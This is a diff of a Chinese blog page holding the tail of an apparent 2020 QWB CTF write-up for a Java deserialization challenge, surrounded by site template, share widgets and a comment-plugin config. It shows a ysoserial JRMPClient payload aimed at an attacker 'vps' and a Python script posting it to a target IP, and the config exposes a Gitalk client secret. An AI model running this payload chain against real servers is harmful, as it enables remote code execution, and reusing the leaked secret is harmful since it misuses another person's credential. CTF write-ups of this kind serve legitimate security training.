+<p><img src="/2020/08/28/2020-qwb/mx6vGXjZXUUflp5AP0Z0WvoOtC5ZqvWK6uTonALgu4hge9t9ICuU2ddWXRjjfExkb189jfdGr7utxt0CRxTxH8Ie8nwG61orWAHMTptSErbdA_pJv7Fm7FFCA3TpovnWcR86eEFO.png" alt="img"></p>
+<p>开启server，然后本地生成payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar JRMPClient <span class="string">'vps:5562'</span> &gt; payload</span><br></pre></td></tr></table></figure>
+
+<p>然后本地再打过去，触发反序列化:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line">proxy = &#123;<span class="string">'http'</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">exp = open(<span class="string">'payload'</span>,<span class="string">'r'</span>).read()</span><br><span class="line"> </span><br><span class="line">requests.post(<span class="string">"http://39.101.166.142:8080/jdk_der"</span>,data=exp,proxies=proxy)</span><br></pre></td></tr></table></figure>
+
+<p>访问日志:</p>
+<p><img src="/2020/08/28/2020-qwb/_gAfmqOdjoVnYmOE7adLGWuG421pv3lcMSV8qkh-UXTSgamY86vdzfUXP8JEB4sfGobl8DOwJAUxvCMMKgTf5_AJ_jZd9AR5gMkpjveloK8d3CO25InB3QpqHCZHOxnyFgGsc1Uw.png" alt="img"></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i><i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -263,61 +258,11 @@
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
         		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
-        		</li>
       		
 		</ul>
 	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/27/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/" class="archive-article-date">
-  	<time datetime="2019-05-27T05:26:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/27/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/">2019 强网杯 wp</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -325,24 +270,173 @@
         		<li class="article-tag-list-item">
         			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
         		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/CTF/wp//" class="article-tag-list-link color3">wp</a>
+        		</li>
       		
 		</ul>
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABxklEQVR42u3aS3LCMBAFQO5/aecAAfGeZAmoaq2o4MidLKbm93jE5/p3xk8mn8f3LB1cXNxl7jU8yTPtH9Dej4uL+yluG5LWv331zBsbLi7uT3GTJCZJgHBxcX+Rm4SncepzNJDh4uIucJPiZ3zRvanPDbUaLi7uamyJupT7Pm/p7+Li4k5xr/LkI5bkhvrtuLi4R7h5QGkHLUlJ074XFxf3JLcNT8lCxlw7tV31wMXF3cHNXz8XhtbrlycZGS4u7hFuUpx8xXIGLi7uQe7u5ap2NPvyX4aLi3uc2w4+kwboyjLHkydxcXGPcOeWsfKG6VwQzBsouLi4Z7h5UpKsV7Zl1UryhIuLey+3nrQszzWSFOrNTBgXF3czty0/8kJofRhT52K4uLg3cfNhyUquNHfDmyUMXFzcI9z8ujyEJUlMXfzg4uIe5yYDj7kGylIWhouLe4R7lWfut+aGsri4uJ/i5id/ZVvYzCVSuLi4u7l58Bpf1D4zuciFi4t7kDtXFLVLVG3xs9TfxcXFPc7Nf9KWQEUXBxcX98u4+QC1DXYbUxxcXNyS265OJuXKGJcXPLi4uOe5ecM0H8O061ntsBYXF3cb9w/8WZCfgZWJswAAAABJRU5ErkJggg==" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2020/08/21/2020-ciscn/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2020 ciscn 初赛 writeup</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#强网先锋-辅助"><span class="toc-number">1.</span> <span class="toc-text">强网先锋-辅助</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网先锋-主动"><span class="toc-number">2.</span> <span class="toc-text">强网先锋-主动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网先锋-Funhash"><span class="toc-number">3.</span> <span class="toc-text">强网先锋-Funhash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#half-infiltration"><span class="toc-number">4.</span> <span class="toc-text">half_infiltration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dice2cry"><span class="toc-number">5.</span> <span class="toc-text">Dice2cry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-java"><span class="toc-number">6.</span> <span class="toc-text">easy_java</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
 
+  
 
+  
+
+<!--显示阅读次数-->
+
+  <br/>
+  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+  <span class="icon-sort"></span>
+  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+            阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+  </span>
+  </a>
+
+<!--显示阅读次数完毕-->
+
+  <div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+
+if(true){
+  var gitalk = new Gitalk({
+    clientID: 'c741c580e5927006c62d',
+    clientSecret: 'f8fdc39531f526b87dac59d9f025c55cb9580617',
+    repo: 'happygml.github.io',
+    owner: 'happygml',
+    admin: ['happygml'],
+    id: 'Fri Aug 28 2020 16:30:49 GMT+0800',
+    distractionFreeMode: 'true'
+})
+gitalk.render('gitalk-container') 
+}
+</script>
+
+  
+
+<!--简书外链-->
+<script>
+var link="";
+var a = document.getElementsByTagName('img');
+for(i=0;i<a.length;i++){
+        if((a[i].src).indexOf("jianshu") > 0){
+        a[i].referrerPolicy='no-referrer';
+        link = a[i].src;
+        a[i].src = link+'?t='+Math.random();
+        }
+}
+</script>
           </div>
         </div>
       </div>
@@ -363,9 +457,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
